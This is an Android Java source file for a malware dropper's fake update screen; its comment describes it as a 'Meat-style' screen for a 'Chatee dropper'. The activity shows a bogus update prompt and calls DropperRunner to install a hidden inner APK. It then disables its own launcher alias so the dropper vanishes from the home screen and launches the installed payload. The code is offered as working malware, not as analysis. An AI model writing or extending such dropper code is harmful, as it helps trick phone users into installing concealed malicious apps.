package com.pkg.loader.dispatch;

import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;

import com.pkg.loader.dispatch.internal.ApkInstaller;
import com.pkg.loader.dispatch.internal.DropperRunner;

/**
 * Meat-style update screen: user opens Chatee dropper → prompted to update → inner APK installs.
 */
public class UpdateActivity extends AppCompatActivity {
    private ProgressBar progressBar;
    private TextView progressText;
    private Button updateButton;
    private boolean updateStarted = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if (ApkInstaller.isInnerInstalled(this)) {
            openInnerAndFinish();
            return;
        }

        setContentView(R.layout.activity_update);
        progressBar = findViewById(R.id.progress_bar);
        progressText = findViewById(R.id.progress_text);
        updateButton = findViewById(R.id.btn_update);

        updateButton.setOnClickListener(v -> startUpdate());
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (ApkInstaller.isInnerInstalled(this)) {
            openInnerAndFinish();
        }
    }

    private void startUpdate() {
        if (updateStarted) {
            return;
        }
        updateStarted = true;
        updateButton.setEnabled(false);
        updateButton.setVisibility(View.GONE);
        progressBar.setVisibility(View.VISIBLE);
        progressText.setVisibility(View.VISIBLE);
        progressText.setText(getString(R.string.update_progress));
        DropperRunner.startInstallFlow(getApplicationContext());
    }

    private void hideDropperLauncher() {
        try {
            getPackageManager().setComponentEnabledSetting(
                new ComponentName(this, LauncherAlias.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        } catch (Exception ignored) {
        }
    }

    private void openInnerAndFinish() {
        hideDropperLauncher();
        ApkInstaller.launchInner(this);
        finish();
    }
}
